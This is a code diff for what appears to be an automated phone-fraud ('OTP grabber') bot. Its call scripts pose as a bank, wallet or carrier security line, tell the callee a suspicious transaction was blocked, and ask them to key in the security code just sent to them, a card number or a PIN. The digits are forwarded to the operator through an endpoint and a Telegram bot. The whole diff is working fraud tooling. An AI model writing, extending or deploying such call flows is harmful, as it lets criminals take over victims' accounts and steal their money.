@@ -1,6 +1,7 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 import { Response } from 'express';
-import { v4 as uuidv4 } from 'uuid';
 import { bot } from '..';
+import { v4 as uuidv4 } from 'uuid';
 
 export const bankFlow = async (
   dtmf: string,
@@ -9,7 +10,9 @@ export const bankFlow = async (
   chatId: number | undefined,
   step: string,
   destination: string,
-): Promise<Response> => {
+  otpLength: number,
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+): Promise<Response<any, Record<string, any>>> => {
   if (dtmf && dtmf === '1') {
     await bot.telegram.sendMessage(
       Number(chatId),
@@ -18,25 +21,24 @@ export const bankFlow = async (
         parse_mode: 'HTML',
       },
     );
+
     return res.json({
       id: uuidv4(),
-      title: `call bank - ${chatId} OTP`,
+      title: `call BANK FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'bankStepOTP',
-          endKey: '#',
-          maxNumKeys: 8,
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -44,19 +46,16 @@ export const bankFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'bankStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'bankStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -69,42 +68,41 @@ export const bankFlow = async (
         parse_mode: 'HTML',
       },
     );
+
     return res.json({
       id: uuidv4(),
-      title: `call bank - ${chatId} OTP`,
+      title: `call BANK FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'bankStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
           action: 'pause',
           options: {
-            length: 10,
+            length: 5,
           },
-          onKeypressGoto: 'bankStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
-          id: 'bankStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -112,7 +110,7 @@ export const bankFlow = async (
   } else if (dtmf && dtmf === '3') {
     return res.json({
       id: uuidv4(),
-      title: `call bank - ${chatId}`,
+      title: `call BANK FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -122,10 +120,11 @@ export const bankFlow = async (
             payload: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'bankStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -133,17 +132,16 @@ export const bankFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'bankStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'bankStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
+            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -151,30 +149,24 @@ export const bankFlow = async (
   } else if (dtmf && dtmf === '*') {
     return res.json({
       id: uuidv4(),
-      title: `call bank - ${chatId} no OTP`,
+      title: `call BANK FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
+            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
             language,
             voice: 'female',
-            loop: true,
           },
         },
-        // {
-        //   id: uuidv4(),
-        //   action: 'hangup',
-        // },
       ],
     });
   } else {
     return res.json({
       id: uuidv4(),
-      title: `call bank - ${chatId}`,
+      title: `call BANK FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -184,10 +176,11 @@ export const bankFlow = async (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'bankStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -195,17 +188,16 @@ export const bankFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'bankStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'bankStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
+            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -220,8 +212,9 @@ export const payFlow = async (
   chatId: number | undefined,
   step: string,
   destination: string,
+  otpLength: number,
   wallet?: string,
-): Promise<Response> => {
+): Promise<Response<any, Record<string, any>>> => {
   if (dtmf && dtmf === '1') {
     await bot.telegram.sendMessage(
       Number(chatId),
@@ -230,41 +223,41 @@ export const payFlow = async (
         parse_mode: 'HTML',
       },
     );
+
     return res.json({
       id: uuidv4(),
-      title: `call pay - ${chatId} OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
+            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'payStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
           action: 'pause',
           options: {
-            length: 10,
+            length: 5,
           },
-          onKeypressGoto: 'payStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
-          id: 'payStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -279,39 +272,38 @@ export const payFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `call pay - ${chatId} OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
+            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'payStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
           action: 'pause',
           options: {
-            length: 10,
+            length: 5,
           },
-          onKeypressGoto: 'payStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
-          id: 'payStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -319,7 +311,7 @@ export const payFlow = async (
   } else if (dtmf && dtmf === '3') {
     return res.json({
       id: uuidv4(),
-      title: `call pay - ${chatId}`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -329,10 +321,11 @@ export const payFlow = async (
             payload: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'payStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -340,21 +333,20 @@ export const payFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'payStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'payStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${
               process.env.ENDPOINT_URL
             }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
               ?.replace(/\s/g, '')
-              .toLowerCase()}`,
+              .toLowerCase()}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -362,7 +354,7 @@ export const payFlow = async (
   } else if (dtmf && dtmf === '*') {
     return res.json({
       id: uuidv4(),
-      title: `call pay - ${chatId} no OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -372,19 +364,14 @@ export const payFlow = async (
             payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
             language,
             voice: 'female',
-            loop: true,
           },
         },
-        // {
-        //   id: uuidv4(),
-        //   action: 'hangup',
-        // },
       ],
     });
   } else {
     return res.json({
       id: uuidv4(),
-      title: `call pay - ${chatId}`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -394,10 +381,11 @@ export const payFlow = async (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'payStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -405,21 +393,20 @@ export const payFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'payStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'payStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${
               process.env.ENDPOINT_URL
             }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
               ?.replace(/\s/g, '')
-              .toLowerCase()}`,
+              .toLowerCase()}?otpLength=${otpLength}`,
           },
         },
       ],
@@ -434,8 +421,9 @@ export const accountFlow = async (
   chatId: number | undefined,
   step: string,
   destination: string,
+  otpLength: number,
   askCardInfo?: string,
-): Promise<Response> => {
+): Promise<Response<any, Record<string, any>>> => {
   if (dtmf && dtmf === '1') {
     await bot.telegram.sendMessage(
       Number(chatId),
@@ -446,39 +434,38 @@ export const accountFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `call account - ${chatId} OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
+            payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'accountStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
           action: 'pause',
           options: {
-            length: 10,
+            length: 5,
           },
-          onKeypressGoto: 'accountStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
-          id: 'accountStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
           },
         },
       ],
@@ -491,41 +478,41 @@ export const accountFlow = async (
         parse_mode: 'HTML',
       },
     );
+
     return res.json({
       id: uuidv4(),
-      title: `call account - ${chatId} OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the code yet please press the star key followed by the pound key`,
+            payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the code yet please press the star key followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'accountStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
           action: 'pause',
           options: {
-            length: 10,
+            length: 5,
           },
-          onKeypressGoto: 'accountStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 8,
+          maxNumKeys: Number(otpLength),
         },
         {
-          id: 'accountStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
           },
         },
       ],
@@ -533,7 +520,7 @@ export const accountFlow = async (
   } else if (dtmf && dtmf === '3') {
     return res.json({
       id: uuidv4(),
-      title: `call account - ${chatId}`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -543,10 +530,11 @@ export const accountFlow = async (
             payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'accountStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -554,17 +542,16 @@ export const accountFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'accountStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'accountStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
+            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
           },
         },
       ],
@@ -572,7 +559,7 @@ export const accountFlow = async (
   } else if (dtmf && dtmf === '*') {
     return res.json({
       id: uuidv4(),
-      title: `call account - ${chatId} no OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -582,19 +569,14 @@ export const accountFlow = async (
             payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
             language,
             voice: 'female',
-            loop: true,
           },
         },
-        // {
-        //   id: uuidv4(),
-        //   action: 'hangup',
-        // },
       ],
     });
   } else {
     return res.json({
       id: uuidv4(),
-      title: `call account - ${chatId}`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -604,10 +586,11 @@ export const accountFlow = async (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'accountStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
           id: uuidv4(),
@@ -615,17 +598,16 @@ export const accountFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'accountStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: Number(otpLength),
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'accountStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
+            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
           },
         },
       ],
@@ -641,7 +623,7 @@ export const cardFlow = async (
   step: string,
   destination: string,
   cardType: string,
-): Promise<Response> => {
+): Promise<Response<any, Record<string, any>>> => {
   if (dtmf && dtmf === '1') {
     await bot.telegram.sendMessage(
       Number(chatId),
@@ -652,22 +634,21 @@ export const cardFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `pay card - ${chatId} OTP`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
+            payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'cardStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 20,
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -675,13 +656,13 @@ export const cardFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'cardStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 20,
+          maxNumKeys: 16,
         },
         {
-          id: 'cardStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
@@ -699,22 +680,21 @@ export const cardFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `call card - ${chatId} OTP`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `For your SECURITY, please enter your ${cardType} card number followed by the pound key`,
+            payload: `For your SECURITY, please enter your ${cardType} card number followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'cardStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 20,
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -722,13 +702,13 @@ export const cardFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'cardStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 20,
+          maxNumKeys: 16,
         },
         {
-          id: 'cardStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
@@ -739,7 +719,7 @@ export const cardFlow = async (
   } else if (dtmf && dtmf === '3') {
     return res.json({
       id: uuidv4(),
-      title: `call card - ${chatId}`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -749,10 +729,11 @@ export const cardFlow = async (
             payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -760,14 +741,13 @@ export const cardFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 16,
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'cardStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
@@ -778,7 +758,7 @@ export const cardFlow = async (
   } else if (dtmf && dtmf === '*') {
     return res.json({
       id: uuidv4(),
-      title: `call card - ${chatId} no OTP`,
+      title: `call PAY FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -788,19 +768,14 @@ export const cardFlow = async (
             payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
             language,
             voice: 'female',
-            loop: true,
           },
         },
-        // {
-        //   id: uuidv4(),
-        //   action: 'hangup',
-        // },
       ],
     });
   } else {
     return res.json({
       id: uuidv4(),
-      title: `call card - ${chatId}`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -810,10 +785,11 @@ export const cardFlow = async (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -821,14 +797,13 @@ export const cardFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 16,
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'cardStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
@@ -847,7 +822,7 @@ export const pinFlow = async (
   step: string,
   destination: string,
   pinType: string,
-): Promise<Response> => {
+): Promise<Response<any, Record<string, any>>> => {
   if (dtmf && dtmf === '1') {
     await bot.telegram.sendMessage(
       Number(chatId),
@@ -858,7 +833,7 @@ export const pinFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `pin step - ${chatId} OTP`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -868,15 +843,14 @@ export const pinFlow = async (
             payload:
               pinType === 'carrierPin'
                 ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `For your security and to protect your account. enter your ${pinType} numbers followed by the pound key`,
+                : `For your security and to protect your account. Enter your ${pinType} followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'pinStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: pinType === 'carrierPin' ? 6 : 4,
+          maxNumKeys: 8,
         },
         {
           id: uuidv4(),
@@ -884,13 +858,13 @@ export const pinFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'pinStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 20,
+          maxNumKeys: 8,
         },
         {
-          id: 'pinStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
@@ -908,7 +882,7 @@ export const pinFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `pin step - ${chatId} OTP`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -918,15 +892,14 @@ export const pinFlow = async (
             payload:
               pinType === 'carrierPin'
                 ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+                : `For your security and to protect your account. Enter your ${pinType} followed by the pound key.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'pinStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: pinType === 'carrierPin' ? 6 : 4,
+          maxNumKeys: 8,
         },
         {
           id: uuidv4(),
@@ -934,13 +907,13 @@ export const pinFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'pinStepOTP',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 20,
+          maxNumKeys: 8,
         },
         {
-          id: 'pinStepOTP',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
             url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
@@ -951,7 +924,7 @@ export const pinFlow = async (
   } else if (dtmf && dtmf === '3') {
     return res.json({
       id: uuidv4(),
-      title: `pin step - ${chatId}`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
@@ -964,10 +937,11 @@ export const pinFlow = async (
                 : `We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
-            loop: true,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
         },
         {
           id: uuidv4(),
@@ -975,17 +949,16 @@ export const pinFlow = async (
           options: {
             length: 5,
           },
-          onKeypressGoto: 'cardStepGoto',
+          onKeypressGoto: 'nextStepGoto',
           onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
         },
         {
-          action: 'hangup',
-        },
-        {
-          id: 'cardStepGoto',
+          id: 'nextStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/dpins/${language}/${step}/${chatId}?pinType=${pinType}`,
+            url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
           },
         },
       ],
@@ -993,7 +966,7 @@ export const pinFlow = async (
   } else {
     return res.json({
       id: uuidv4(),
-      title: `pin step - ${chatId}`,
+      title: `call CARD FLOW - ${chatId}`,
       record: false,
       steps: [
         {
